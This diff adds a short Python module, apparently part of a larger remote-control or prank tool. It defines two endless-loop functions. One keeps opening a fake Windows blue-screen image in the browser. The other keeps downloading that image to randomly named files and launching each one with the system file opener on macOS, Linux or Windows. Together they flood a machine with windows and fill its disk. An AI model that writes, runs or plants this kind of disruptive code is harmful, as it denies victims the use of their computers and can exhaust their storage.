@@ -1,0 +1,38 @@
+import subprocess
+import requests
+import webbrowser
+from threading import Thread
+from random import choice
+import os
+
+from core.config import SOCKET_RUNTIME_DIR
+
+url = 'https://upload.wikimedia.org/wikipedia/commons/3/3b/Windows_9X_BSOD.png'
+
+def gen_name(num: int = 8):
+    g = ""
+    for _ in range(num):
+        g += choice(list("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
+    return g
+
+def browser_open():
+    while True:
+        webbrowser.open(url)
+
+def img():
+    while True:
+        p = requests.get(url)
+        name = gen_name()
+        SOCKET_RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
+        out_path = str(SOCKET_RUNTIME_DIR / f"{name}.jpg")
+        with open(out_path, "wb") as out:
+            out.write(p.content)
+
+        # Определение платформы и открытие файла
+        if os.name == 'posix':  # macOS или Linux
+            if os.uname().sysname == 'Darwin':
+                subprocess.run(["open", out_path])  # macOS
+            else:
+                subprocess.run(["xdg-open", out_path])  # Linux
+        else:  # Windows
+            subprocess.run(["start", out_path], shell=True)
